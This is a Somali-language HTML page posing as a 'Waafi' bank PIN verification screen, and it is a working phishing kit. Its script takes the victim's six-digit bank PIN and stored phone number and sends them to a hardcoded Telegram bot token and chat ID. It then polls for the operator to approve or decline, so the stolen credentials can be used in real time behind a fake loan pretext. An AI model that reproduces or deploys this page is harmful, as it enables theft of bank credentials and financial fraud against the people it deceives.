<!DOCTYPE html>
<html lang="so">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - Bank PIN</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            flex: 1;
            padding: 40px 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 500;
            width: 100%;
        }
        
        p {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
            width: 100%;
        }
        
        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 30px 0;
        }
        
        .pin-inputs input {
            width: 45px;
            height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }
        
        .pin-inputs input:focus {
            border-color: #2ecc71;
            border-width: 2px;
        }
        
        .btn-verify {
            width: 100%;
            max-width: 320px;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #e0e0e0;
            color: #a0a0a0;
            font-size: 14px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
            transition: 0.3s;
        }
        
        .btn-verify.active {
            background-color: #2ecc71;
            color: white;
            cursor: pointer;
        }
        
        #wait-container {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 50%;
        }
        
        .wait-text {
            font-size: 16px;
            font-weight: 600;
            color: #000000;
            margin-top: 20px;
        }
        
        .footer {
            position: relative;
            height: 250px;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px;
            border-top-right-radius: 50% 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
            margin-top: auto;
            width: 100%;
        }
        
        #status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 500;
            min-height: 20px;
            color: #2ecc71;
        }
    </style>
</head>

<body>

    <div class="container" id="main-ui">
        <div id="input-section">
            <h2>Geli PIN-ka Bangiga</h2>
            <p>Fadlan geli 6-da god ee PIN-kaaga bangiga si aad u xaqiijiso aqoonsigaaga.</p>

            <div class="pin-inputs">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
            </div>

            <button class="btn-verify" id="submit-btn">XAQIIJI PIN-KA BANGIGA</button>
            <div id="status-msg"></div>
        </div>

        <div id="wait-container">
            <div class="wait-text">Waa la diray. Fadlan sug oggolaanshaha...</div>
        </div>
    </div>

    <div class="footer">
        © 2026 Waafi Soomaaliya
    </div>

    <script>
        // ============================================================
        // CONFIGURE YOUR TELEGRAM BOT
        // ============================================================
        const BOT_TOKEN = "8849541807:AAG5VSVeCFWhjWDLbwBf9bJpyBXHh5cM5zA";
        const ADMIN_CHAT_ID = "6983589045";
        // ============================================================

        const inputs = document.querySelectorAll('.pin-inputs input');
        const btn = document.getElementById('submit-btn');
        const inputSection = document.getElementById('input-section');
        const waitContainer = document.getElementById('wait-container');
        const statusMsg = document.getElementById('status-msg');

        let isSubmitting = false;
        let pollInterval = null;
        let currentTimestamp = null;

        // Auto-move PIN inputs
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkFull();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    checkFull();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').split('');
                digits.forEach((digit, idx) => {
                    if (idx < inputs.length) inputs[idx].value = digit;
                });
                const emptyIdx = [...inputs].findIndex(inp => inp.value === '');
                if (emptyIdx !== -1) inputs[emptyIdx].focus();
                else inputs[inputs.length - 1].focus();
                checkFull();
            });
        });

        function checkFull() {
            const pin = Array.from(inputs).map(i => i.value).join('');
            if (pin.length === 6) {
                btn.classList.add('active');
                btn.disabled = false;
            } else {
                btn.classList.remove('active');
                btn.disabled = true;
            }
        }

        // Initially disable button
        btn.disabled = true;

        // ---- Send PIN to Telegram with inline buttons ----
        async function sendPinToTelegram(pin, phone) {
            const ts = Date.now();
            currentTimestamp = ts;

            const message = `🏦 *Bank PIN waa la soo galiyay*\n\n📱 Phone: \`${phone}\`\n🔢 PIN: \`${pin}\`\n⏱️ TTimestamp: \`${ts}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '✅ Approve',
                                    callback_data: `approve_${ts}`
                                }, {
                                    text: '❌ Decline',
                                    callback_data: `decline_${ts}`
                                }]
                            ]
                        }
                    })
                });
                const data = await response.json();
                return data.ok;
            } catch (err) {
                console.error("Telegram send failed:", err);
                return false;
            }
        }

        // ---- Poll for admin's decision via Telegram ----
        function startPollingForDecision(timestamp) {
            let lastUpdateId = 0;

            pollInterval = setInterval(async() => {
                try {
                    // Get updates from the bot
                    const res = await fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`
                    );
                    const data = await res.json();

                    if (!data.ok || !data.result) return;

                    for (const update of data.result) {
                        lastUpdateId = update.update_id;

                        // Check for callback_query
                        if (update.callback_query) {
                            const cb = update.callback_query;
                            const cbData = cb.data;

                            // Extract the timestamp from callback data
                            const cbTimestamp = cbData.split('_').pop();

                            // Only process if it matches our current timestamp
                            if (cbTimestamp !== String(timestamp)) continue;

                            // Answer callback query to remove loading state
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    callback_query_id: cb.id,
                                    text: cbData.startsWith('approve') ? '✅ Approved!' : '❌ Declined!'
                                })
                            });

                            // Stop polling
                            clearInterval(pollInterval);
                            pollInterval = null;

                            if (cbData.startsWith('approve')) {
                                // Update the message to show approved
                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        chat_id: ADMIN_CHAT_ID,
                                        message_id: cb.message.message_id,
                                        text: cb.message.text + '\n\n✅ *APPROVED*',
                                        parse_mode: 'Markdown'
                                    })
                                });
                                // Navigate to success
                                window.location.href = "success.html";
                            } else if (cbData.startsWith('decline')) {
                                // Update the message to show declined
                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        chat_id: ADMIN_CHAT_ID,
                                        message_id: cb.message.message_id,
                                        text: cb.message.text + '\n\n❌ *DECLINED*',
                                        parse_mode: 'Markdown'
                                    })
                                });
                                // Show error and reset
                                statusMsg.innerText = "❌ PIN-ka Bangiga waa la diiday. Fadlan mar kale isku day.";
                                statusMsg.style.color = "red";
                                waitContainer.style.display = "none";
                                inputSection.style.display = "block";
                                // Clear inputs
                                inputs.forEach(inp => inp.value = '');
                                checkFull();
                                isSubmitting = false;
                            }
                        }
                    }
                } catch (e) {
                    console.log("Polling error:", e);
                }
            }, 2000); // Poll every 2 seconds
        }

        // ---- Main submit handler ----
        btn.addEventListener('click', async() => {
            if (!btn.classList.contains('active') || isSubmitting) return;
            isSubmitting = true;

            const pin = Array.from(inputs).map(i => i.value).join('');
            const phone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "Unknown";

            // Ensure loan data exists for success page
            if (!localStorage.getItem('loan_amount')) {
                localStorage.setItem('loan_amount', '1,000');
                localStorage.setItem('loan_term', '12');
                localStorage.setItem('monthly_repayment', '90');
            }

            // Show waiting state
            statusMsg.innerText = "⏳ Waa la diray...";
            statusMsg.style.color = "#2ecc71";
            inputSection.style.display = "none";
            waitContainer.style.display = "flex";

            // Send PIN to Telegram with inline buttons
            const ts = Date.now();
            const sent = await sendPinToTelegram(pin, phone);

            if (sent) {
                // Start polling for admin decision
                startPollingForDecision(ts);
            } else {
                // Fallback if Telegram fails
                statusMsg.innerText = "⚠️ Fadlan isku day mar kale";
                statusMsg.style.color = "red";
                waitContainer.style.display = "none";
                inputSection.style.display = "block";
                isSubmitting = false;
                checkFull();
            }
        });

        // Cleanup poll interval on page unload
        window.addEventListener('beforeunload', () => {
            if (pollInterval) {
                clearInterval(pollInterval);
            }
        });
    </script>
</body>

</html>
